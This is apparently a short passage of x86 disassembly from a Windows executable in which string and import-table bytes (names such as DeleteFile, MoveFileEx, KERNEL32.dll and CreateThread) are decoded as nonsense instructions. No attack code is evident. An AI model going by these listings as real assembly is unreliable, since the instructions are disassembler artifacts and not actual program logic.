  429539:	outs   dx,BYTE PTR ds:[esi]
  42953a:	ins    BYTE PTR es:[edi],dx
  42953b:	outs   dx,DWORD PTR ds:[esi]
  42953c:	arpl   WORD PTR [ebx+0x0],bp
  42953f:	add    dh,ch
  429541:	add    edx,DWORD PTR [ebx+0x65]
  429544:	je     0x429589
  429546:	outs   dx,DWORD PTR ds:[esi]
  429547:	ins    DWORD PTR es:[edi],dx
  429548:	ins    DWORD PTR es:[edi],dx
  429549:	push   ebx
  42954a:	je     0x4295ad
  42954c:	je     0x4295b3
  42954e:	add    BYTE PTR [eax],al
  429550:	out    dx,eax
  429551:	add    DWORD PTR [edi+0x65],eax
  429554:	je     0x42959c
  429556:	imul   ebp,DWORD PTR [ebp+eiz*2+0x41],0x69727474
  42955e:	bound  esi,QWORD PTR [ebp+0x74]
  429561:	gs jae 0x4295a5
  429564:	add    BYTE PTR [eax],al
  429566:	sub    al,0x1
  429568:	inc    ebp
  429569:	outs   dx,BYTE PTR ds:[esi]
  42956a:	jne    0x4295d9
  42956c:	push   ebx
  42956d:	jns    0x4295e2
  42956f:	je     0x4295d6
  429571:	ins    DWORD PTR es:[edi],dx
  429572:	dec    esp
  429573:	outs   dx,DWORD PTR ds:[esi]
  429574:	arpl   WORD PTR [ecx+0x6c],sp
  429577:	gs jae 0x4295bb
  42957a:	add    BYTE PTR [eax],al
  42957c:	sub    eax,0x74655304
  429581:	dec    esp
  429582:	outs   dx,DWORD PTR ds:[esi]
  429583:	arpl   WORD PTR [ecx+0x6c],sp
  429586:	push   esp
  429587:	imul   ebp,DWORD PTR [ebp+0x65],0x1240000
  42958e:	inc    ebp
  42958f:	outs   dx,BYTE PTR ds:[esi]
  429590:	jne    0x4295ff
  429592:	push   edx
  429593:	gs jae 0x429605
  429596:	jne    0x42960a
  429598:	arpl   WORD PTR [ebp+0x4e],sp
  42959b:	popa   
  42959c:	ins    DWORD PTR es:[edi],dx
  42959d:	gs jae 0x4295f7
  4295a0:	add    BYTE PTR [eax],al
  4295a2:	imul   eax,DWORD PTR [esp+edx*2],0x7246736c
  4295a9:	gs add BYTE PTR gs:[ebx],ah
  4295ad:	add    al,0x53
  4295af:	gs je  0x4295f8
  4295b2:	imul   ebp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  4295ba:	gs jb  0x4295bd
  4295bd:	add    BYTE PTR [edi+0x1],ch
  4295c0:	inc    esi
  4295c1:	imul   ebp,DWORD PTR [esi+0x64],0x6f736552
  4295c8:	jne    0x42963c
  4295ca:	arpl   WORD PTR [ebp+0x41],sp
  4295cd:	add    BYTE PTR ds:0x6c654401,al
  4295d3:	gs je  0x42963b
  4295d6:	inc    esi
  4295d7:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x4701a400
  4295df:	gs je  0x429625
  4295e2:	outs   dx,DWORD PTR ds:[esi]
  4295e3:	ins    DWORD PTR es:[edi],dx
  4295e4:	jo     0x42965b
  4295e6:	je     0x42964d
  4295e8:	jb     0x429638
  4295ea:	popa   
  4295eb:	ins    DWORD PTR es:[edi],dx
  4295ec:	gs inc ebp
  4295ee:	js     0x429631
  4295f0:	add    BYTE PTR [eax],al
  4295f2:	cmp    BYTE PTR [ebx],al
  4295f4:	dec    ebp
  4295f5:	outs   dx,DWORD PTR ds:[esi]
  4295f6:	jbe    0x42965d
  4295f8:	inc    esi
  4295f9:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x52454b00
  429601:	dec    esi
  429602:	inc    ebp
  429603:	dec    esp
  429604:	xor    esi,DWORD PTR [edx]
  429606:	cs fs ins BYTE PTR es:[edi],dx
  429609:	ins    BYTE PTR es:[edi],dx
  42960a:	add    BYTE PTR [eax],al
  42960c:	add    BYTE PTR [eax],al
  42960e:	add    BYTE PTR [eax],al
  429610:	jl     0x429634
  429612:	add    al,BYTE PTR [eax]
	...
  429630:	dec    ebx
  429631:	xchg   esi,eax
  429632:	add    al,BYTE PTR [eax]
	...
  429640:	imul   esp,DWORD PTR fs:[edx+0x6f],0x632e6661
  429648:	outs   dx,DWORD PTR ds:[esi]
  429649:	ins    DWORD PTR es:[edi],dx
  42964a:	add    BYTE PTR [ebx+0x72],al
  42964d:	je     0x4296a3
  42964f:	push   0x64616572
  429654:	inc    ebp
  429655:	js     0x429698
  429657:	inc    eax
  429658:	cmp    BYTE PTR [eax],al
